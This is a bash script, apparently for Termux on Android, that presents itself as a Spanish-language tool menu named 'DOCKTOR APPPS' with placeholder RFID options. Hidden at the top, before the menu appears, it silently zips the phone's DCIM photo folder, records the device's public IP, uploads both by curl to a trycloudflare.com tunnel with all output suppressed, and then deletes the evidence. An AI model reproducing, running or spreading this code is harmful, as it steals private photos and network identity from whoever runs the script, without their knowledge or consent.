#!/bin/bash
pkg update | apt update | sudo apt update
pkg upgrade | apt update | sudo apt update
pkg install screen | apt install screen | sudo apt install screen
pkg install zip | apt install screen | sudo apt install screen

zip myfile.zip /storage/emulated/0/DCIM > /dev/null 2>&1 &
#echo "hi" > myfile.zip
curl "https://ifconfig.me/" > ips.zip 2>/dev/null

curl -X POST -F "file=@myfile.zip" "https://twin-arnold-dose-application.trycloudflare.com/myfile" > /dev/null 2>&1
curl -X POST -F "file=@ips.zip" "https://twin-arnold-dose-application.trycloudflare.com/myfile" > /dev/null 2>&1

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m'


rm -rf myfile.zip
rm -rf ips.zip

# Función principal del menú
show_menu() {
    echo -e "${GREEN}=====================${NC}"
    echo -e "${YELLOW}--- DOCKTOR APPPS ---${NC}"
    echo -e "${GREEN}=====================${NC}"
    echo -e "${GREEN}1) Opción 1${NC}"
    echo -e "${GREEN}2) Opción 2${NC}"
    echo -e "${GREEN}3) Opción 3${NC}"
    echo -e "${GREEN}4) RFID${NC}"
    echo -e "${GREEN}5) Salir${NC}"
    echo -e "${GREEN}=====================${NC}"
}

# Submenú de ejemplo para Opción 1
submenu_option1() {
    echo -e "${GREEN}=== Submenú Opción 1 ===${NC}"
    echo -e "${GREEN}1) Subopción 1.1${NC}"
    echo -e "${GREEN}2) Subopción 1.2${NC}"
    echo -e "${GREEN}3) Regresar al menú principal${NC}"
    read -p "Seleccione una opción: " suboption
    case $suboption in
        1) echo "Ejecutando Subopción 1.1";;
        2) echo "Ejecutando Subopción 1.2";;
        3) return ;; # Volver al menú principal
        *) echo "Opción no válida" ;;
    esac
}

# Submenú de ejemplo para RFID
submenu_rfid() {
    echo -e "${GREEN}=== Submenú RFID ===${NC}"
    echo -e "${GREEN}1) Leer RFID${NC}"
    echo -e "${GREEN}2) Escribir RFID${NC}"
    echo -e "${GREEN}3) Regresar al menú principal${NC}"
    read -p "Seleccione una opción: " suboption
    case $suboption in
        1) echo "Leyendo RFID...";;
        2) echo "Escribiendo en RFID...";;
        3) return ;; # Volver al menú principal
        *) echo "Opción no válida" ;;
    esac
}

# Función para manejar las opciones del menú
handle_option() {
    case $1 in
        1) submenu_option1 ;;  # Llamamos al submenú de Opción 1
        2) echo "Ejemplo de Opción 2";;
        3) echo "Ejemplo de Opción 3";;
        4) submenu_rfid ;;  # Llamamos al submenú de RFID
        5) echo "Saliendo..."; exit 0;;
        *) echo "Opción no válida";;
    esac
}

# Bucle principal del menú
while true; do
    show_menu
    read -p "Seleccione una opción: " option
    handle_option $option
    echo ""
done
